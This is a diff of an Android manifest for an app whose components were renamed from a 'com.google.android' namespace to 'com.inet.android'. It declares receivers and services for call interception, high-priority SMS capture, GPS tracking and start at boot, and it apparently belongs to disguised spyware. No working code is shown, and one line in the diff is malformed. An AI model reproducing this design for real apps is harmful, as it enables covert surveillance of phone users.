@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.google.android.certificate"
+    package="com.inet.android.certificate"
     android:sharedUserLabel="@drawable/ic_launcher"
     android:versionCode="1"
     android:versionName="1.0" >
@@ -21,6 +21,7 @@
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
     <uses-permission android:name="android.permission.SEND_SMS" />
 
+    <uses-feature android:name="android.permission.CHANGE_COMPONENT_ENABLED_STATE" />
     <uses-feature android:name="android.hardware.telephony" />
 
     <uses-permission android:name="android.permission.RECEIVE_MMS" />
@@ -33,7 +34,7 @@
     <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <uses-permission android:name="android.permission.GET_TASKS" />
 
     <application
         android:allowBackup="true"
@@ -41,7 +42,7 @@
         android:label="@string/app_name"
         android:theme="@style/AppTheme" >
         <activity
-            android:name="com.google.android.bs.MainActivity"
+            android:name="com.inet.android.bs.MainActivity"
             android:label="@string/app_name"
             android:theme="@android:style/Theme.Dialog" >
             <intent-filter>
@@ -52,12 +53,12 @@
         </activity>
 
         <service
-            android:name="com.google.android.history.LinkService"
+            android:name="com.inet.android.history.LinkService"
             android:enabled="true" >
         </service>
 
         <receiver
-            android:name="com.google.android.bs.BootBroadcastReceiver"
+            android:name="com.inet.android.bs.BootBroadcastReceiver"
             android:enabled="true"
             android:exported="false"
             android:permission="android.permission.RECEIVE_BOOT_COMPLETED" >
@@ -65,14 +66,14 @@
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
             </intent-filter>
         </receiver>
-        <receiver android:name="com.google.android.call.CallReceiver" >
+        <receiver android:name="com.inet.android.call.CallReceiver" >
             <intent-filter>
                 <action android:name="android.intent.action.PHONE_STATE" />
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
             </intent-filter>
         </receiver>
         <receiver
-            android:name="com.google.android.sms.SMSBroadcastReceiver"
+            android:name="com.inet.android.sms.SMSBroadcastReceiver"
             android:enabled="true" >
             <intent-filter android:priority="1000" >
  >  
@@ -89,11 +90,11 @@
         </receiver>
 
         <service
-            android:name="com.google.android.location.GPSTracker"
+            android:name="com.inet.android.location.GPSTracker"
             android:enabled="true" >
         </service>
 
-        <receiver android:name="com.google.android.bs.NetworkChangeReceiver" >
+        <receiver android:name="com.inet.android.bs.NetworkChangeReceiver" >
             <intent-filter>
                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
                 <action android:name="android.net.wifi.WIFI_STATE_CHANGED" />
@@ -101,7 +102,7 @@
             </intent-filter>
         </receiver>
 
-        <service android:name="com.google.android.bs.Request4" >
+        <service android:name="com.inet.android.bs.Request4" >
         </service>
     </application>
 
